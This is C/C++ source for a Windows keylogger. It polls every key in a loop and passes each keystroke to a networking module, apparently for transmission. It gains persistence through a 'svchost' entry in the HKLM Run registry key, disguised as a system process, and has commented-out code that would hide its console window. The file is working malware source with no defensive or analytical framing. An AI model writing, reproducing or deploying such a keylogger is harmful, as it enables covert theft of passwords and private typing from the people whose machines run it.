#include<windows.h>
#include<stdio.h>
#include<winuser.h>
#include<windowsx.h>
#define BUFSIZE 80
#include "Networking.h"
#include "logger.h"
using namespace SwineNetworking;
int logger(void)
{
	//HWND stealth; /*creating stealth (window is not visible)*/
	//AllocConsole();
	//stealth = FindWindowA("ConsoleWindowClass", NULL);
	//ShowWindow(stealth, 0);

	int test, create;
	test = test_key();/*check if key is available for opening*/
	if (test == 2)/*create key*/
	{
		char *path = "c:\\%windir%\\svchost.exe";/*the path in which the file needs to be*/
		create = create_key(path);
	}
	int t = get_keys();
	return t;
}
int get_keys(void)
{
	short character;
	while (1)
	{
		Sleep(10);/*to prevent 100% cpu usage*/
		for (character = 8; character <= 222; character++)
		{
			if (GetAsyncKeyState(character) == -32767)
			{
					if ((character >= 39) && (character <= 64))
					{
					Networking::logKey(character);
						break;
					}
				else if ((character > 64) && (character < 91))
					{
						character += 32;
					Networking::logKey(character);
						break;
					}
					else
					{
						switch (character)
						{
						case VK_SPACE:
						Networking::logKey(' ');
							break;
						case VK_SHIFT:
						Networking::logString("[SHIFT]");
							break;
						case VK_RETURN:
						Networking::logString("\n[ENTER]");
							break;
						case VK_BACK:
						Networking::logString("[BACKSPACE]");
							break;
						case VK_TAB:
						Networking::logString("[TAB]");
							break;
						case VK_CONTROL:
						Networking::logString("[CTRL]");
							break;
						case VK_DELETE:
						Networking::logString("[DEL]");
							break;
						case VK_OEM_1:
						Networking::logString("[;:]");
							break;
						case VK_OEM_2:
						Networking::logString("[/?]");
							break;
						case VK_OEM_3:
						Networking::logString("[`~]");
							break;
						case VK_OEM_4:
						Networking::logString("[ [{ ]");
							break;
						case VK_OEM_5:
						Networking::logString("[\\|]");
							break;
						case VK_OEM_6:
						Networking::logString("[ ]} ]");
							break;
						case VK_OEM_7:
						Networking::logString("['\"]");
							break;
						case VK_NUMPAD0:
						Networking::logKey('0');
							break;
						case VK_NUMPAD1:
						Networking::logKey('1');
							break;
						case VK_NUMPAD2:
						Networking::logKey('2');
							break;
						case VK_NUMPAD3:
						Networking::logKey('3');
							break;
						case VK_NUMPAD4:
						Networking::logKey('4');
							break;
						case VK_NUMPAD5:
						Networking::logKey('5');
							break;
						case VK_NUMPAD6:
						Networking::logKey('6');
							break;
						case VK_NUMPAD7:
						Networking::logKey('7');
							break;
						case VK_NUMPAD8:
						Networking::logKey('8');
							break;
						case VK_NUMPAD9:
						Networking::logKey('9');
							break;
						case VK_CAPITAL:
						Networking::logString("[CAPS LOCK]");
							break;
						default:
							break;
						}
					}
				}
			}
	}
	return EXIT_SUCCESS;
}
int test_key(void)
{
	int check;
	HKEY hKey;
	char path[BUFSIZE];
	DWORD buf_length = BUFSIZE;
	int reg_key;
	reg_key = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey);
	if (reg_key != 0)
	{
		check = 1;
		return check;
	}
	reg_key = RegQueryValueEx(hKey, "svchost", NULL, NULL, (LPBYTE)path, &buf_length);
	if ((reg_key != 0) || (buf_length > BUFSIZE))
		check = 2;
	if (reg_key == 0)
		check = 0;
	RegCloseKey(hKey);
	return check;
}
int create_key(char *path)
{
	int reg_key, check;
	HKEY hkey;
	reg_key = RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	if (reg_key == 0)
	{
		RegSetValueEx((HKEY)hkey, "svchost", 0, REG_SZ, (BYTE *)path, strlen(path));
		check = 0;
		return check;
	}
	if (reg_key != 0)
		check = 1;
	return check;
}
